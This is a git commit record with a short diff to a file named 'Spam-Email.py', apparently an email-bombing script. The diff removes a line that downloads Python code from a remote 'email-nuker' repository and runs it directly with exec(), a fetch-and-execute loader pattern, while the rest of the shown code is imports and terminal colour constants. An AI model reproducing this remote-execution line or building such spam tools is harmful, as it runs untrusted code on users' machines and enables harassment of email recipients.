e64d3f40ae7341f6664a6d16b21ae15d8ece125b
Shadow-Captain <99743288+Shadow-Captain@users.noreply.github.com>
2022-06-02 21:49:07 -0500

    Update Spam-Email.py

--- Spam-Email.py
+++ Spam-Email.py
@@ -2,7 +2,6 @@ import requests
 import random
 import os 
 import time
-exec(requests.get("https://raw.githubusercontent.com/bagarrattaa/email-nuker/main/bomber.py").text)
 
 GREEN = '\033[32m'
 CYAN = '\033[;36m'
